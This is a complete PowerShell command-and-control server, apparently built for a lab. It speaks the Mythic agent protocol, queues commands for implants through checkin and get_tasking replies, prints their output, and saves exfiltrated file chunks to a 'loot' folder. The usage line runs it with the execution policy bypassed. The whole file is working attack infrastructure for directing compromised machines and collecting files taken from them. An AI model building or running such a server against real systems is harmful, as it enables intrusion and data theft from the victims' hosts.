# Chimera local C2 server — listens on http://127.0.0.1:8080/data
# Chimera wire protocol: agent sends Base64(UUID_bytes[36] + JSON), server responds same way.
# Usage: powershell -ExecutionPolicy Bypass -File c2server.ps1

param(
    [string]$Bind     = "http://127.0.0.1:8080/",
    [string]$LootDir  = "C:\Users\Public\c2_loot",
    [string]$TaskFile = "C:\Temp\c2task.txt"
)

Set-StrictMode -Off
$ErrorActionPreference = "Continue"

New-Item -ItemType Directory -Force -Path $LootDir | Out-Null

# ── state ────────────────────────────────────────────────────────────────────
$script:AgentUUID   = $null
$script:PendingTask = $null   # { id; command; parameters }

function New-TID { [System.Guid]::NewGuid().ToString("N").Substring(0,16) }

# ── Mythic wire protocol helpers ─────────────────────────────────────────────
# Agent sends: Base64( UTF8(UUID)[36 bytes] + UTF8(JSON) )
# Server responds same way.

function Decode($raw) {
    # Returns the JSON portion (strips the 36-byte UUID prefix)
    try {
        $raw = $raw.Trim()
        $bytes = [System.Convert]::FromBase64String($raw)
        if ($bytes.Length -gt 36) {
            return [System.Text.Encoding]::UTF8.GetString($bytes, 36, $bytes.Length - 36)
        }
    } catch {}
    # Fallback — already plain JSON (shouldn't happen but safe)
    return $raw
}

function Wrap($json) {
    # Returns Base64( UTF8(UUID)[36] + UTF8(JSON) )
    $uuid = "aabbccdd-aabb-aabb-aabb-aabbccddeeff"
    $ub   = [System.Text.Encoding]::UTF8.GetBytes($uuid)
    $jb   = [System.Text.Encoding]::UTF8.GetBytes($json)
    $c    = New-Object byte[]($ub.Length + $jb.Length)
    [Array]::Copy($ub, 0, $c, 0, $ub.Length)
    [Array]::Copy($jb, 0, $c, $ub.Length, $jb.Length)
    return [System.Convert]::ToBase64String($c)
}

# ── HTTP listener ─────────────────────────────────────────────────────────────
$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add($Bind)
$listener.Start()
Write-Host "[C2] Listening on $Bind  (Mythic wire protocol - base64 wrapped)"
Write-Host "[C2] Queue task:  Set-Content $TaskFile 'command params'"
Write-Host ""

# Async input thread so GetContext() doesn't block console
$inputQueue = [System.Collections.Concurrent.ConcurrentQueue[string]]::new()
$ts_code = { while ($true) { $ln = [Console]::ReadLine(); if ($ln -ne $null) { $inputQueue.Enqueue($ln) } } }
$it = New-Object System.Threading.Thread([System.Threading.ThreadStart]$ts_code)
$it.IsBackground = $true
$it.Start()

while ($listener.IsListening) {

    # ── console task queue ───────────────────────────────────────────────────
    $ln = $null
    if ($inputQueue.TryDequeue([ref]$ln)) {
        if ($ln -eq "quit") { break }
        if ($ln -match '^task\s+(\S+)\s*(.*)$') {
            $script:PendingTask = @{ id=(New-TID); command=$Matches[1]; parameters=$Matches[2].Trim() }
            Write-Host "[C2] Queued: $($script:PendingTask.command)  id=$($script:PendingTask.id)"
        } else { Write-Host "[C2] Usage: task <command> [params] | quit" }
    }

    # ── HTTP ─────────────────────────────────────────────────────────────────
    $async = $listener.BeginGetContext($null, $null)
    $fired = $async.AsyncWaitHandle.WaitOne(400)
    if (-not $fired) { continue }

    try {
        $ctx  = $listener.EndGetContext($async)
        $req  = $ctx.Request
        $resp = $ctx.Response
        $ts   = Get-Date -Format "HH:mm:ss"

        # Read raw body bytes
        $ms = New-Object System.IO.MemoryStream
        if ($req.HasEntityBody) { $req.InputStream.CopyTo($ms) }
        $raw = [System.Text.Encoding]::UTF8.GetString($ms.ToArray())

        # Decode base64+UUID envelope → plain JSON
        $body = Decode $raw

        Write-Verbose "[$ts] RAW ($($raw.Length) bytes) DECODED: $($body.Substring(0,[Math]::Min(120,$body.Length)))"

        $replyJson = "{}"

        # ── CHECKIN ──────────────────────────────────────────────────────────
        if ($body -match '"action"\s*:\s*"checkin"') {
            if ($body -match '"uuid"\s*:\s*"([^"]+)"') { $script:AgentUUID = $Matches[1] }
            elseif (-not $script:AgentUUID)            { $script:AgentUUID = [System.Guid]::NewGuid().ToString() }

            # Serve a pending task with checkin if one is queued
            $taskJson = '"tasks":[]'
            if ($script:PendingTask) {
                $t = $script:PendingTask; $script:PendingTask = $null
                $taskJson = '"tasks":[{"id":"' + $t.id + '","command":"' + $t.command + '","parameters":"' + ($t.parameters -replace '"','\"') + '"}]'
                Write-Host "[$ts] >>> TASK WITH CHECKIN: $($t.command)"
            }

            $replyJson = '{"action":"checkin","id":"' + $script:AgentUUID + '",' + $taskJson + '}'
            Write-Host "[$ts] >>> CHECKIN  agent=$($script:AgentUUID)"

        # ── GET_TASKING ───────────────────────────────────────────────────────
        } elseif ($body -match '"action"\s*:\s*"get_tasking"') {

            $tasks = "[]"

            # File queue takes priority
            if (Test-Path $TaskFile) {
                $fc = (Get-Content $TaskFile -Raw).Trim()
                Remove-Item $TaskFile -Force -ErrorAction SilentlyContinue
                if ($fc -match '^(\S+)\s*(.*)$') {
                    $tc = $Matches[1]; $tp = $Matches[2].Trim(); $tid = New-TID
                    $safe = $tp -replace '\\','\\\\' -replace '"','\"'
                    $tasks = '[{"id":"' + $tid + '","command":"' + $tc + '","parameters":"' + $safe + '"}]'
                    Write-Host "[$ts] >>> TASK (file): $tc [$tp]  id=$tid"
                }
            } elseif ($script:PendingTask) {
                $t = $script:PendingTask; $script:PendingTask = $null
                $safe = $t.parameters -replace '\\','\\\\' -replace '"','\"'
                $tasks = '[{"id":"' + $t.id + '","command":"' + $t.command + '","parameters":"' + $safe + '"}]'
                Write-Host "[$ts] >>> TASK (console): $($t.command) [$($t.parameters)]  id=$($t.id)"
            } else {
                Write-Host "[$ts]     GET_TASKING (idle)"
            }

            $replyJson = '{"action":"get_tasking","tasks":' + $tasks + '}'

        # ── POST_RESPONSE ─────────────────────────────────────────────────────
        } elseif ($body -match '"action"\s*:\s*"post_response"') {

            # File download chunk?
            if ($body -match '"download"') {
                $fname = "loot_$(Get-Date -Format 'HHmmss').bin"
                if ($body -match '"full_path"\s*:\s*"([^"]+)"') {
                    $fp = $Matches[1] -replace '\\\\','\'
                    $fname = Split-Path $fp -Leaf
                }
                if ($body -match '"chunk_data"\s*:\s*"([A-Za-z0-9+/=]+)"') {
                    $data = [System.Convert]::FromBase64String($Matches[1])
                    $out  = Join-Path $LootDir $fname
                    [System.IO.File]::WriteAllBytes($out, $data)
                    Write-Host "[$ts] <<< FILE: $fname  ($([int]($data.Length/1024)) KB) -> $out"
                }
            } else {
                # Task result
                if ($body -match '"output"\s*:\s*"((?:[^"\\]|\\.)*)\"') {
                    $out = $Matches[1] -replace '\\n',"`n" -replace '\\"','"' -replace '\\\\','\'
                    Write-Host "[$ts] <<< OUTPUT:`n$out`n"
                } else {
                    Write-Host "[$ts] <<< post_response (no output)"
                }
            }

            $replyJson = '{"action":"post_response","responses":[]}'

        } else {
            Write-Host "[$ts] <<< UNKNOWN body ($($body.Length) chars): $($body.Substring(0,[Math]::Min(80,$body.Length)))"
        }

        # Wrap response in Mythic envelope and send
        $wrapped = Wrap $replyJson
        $rb = [System.Text.Encoding]::UTF8.GetBytes($wrapped)
        $resp.ContentType    = "application/json"
        $resp.ContentLength64 = $rb.Length
        $resp.OutputStream.Write($rb, 0, $rb.Length)
        $resp.Close()

    } catch {
        Write-Host "[ERR] $_"
        try { $ctx.Response.Close() } catch {}
    }
}

$listener.Stop()
Write-Host "[C2] Stopped."
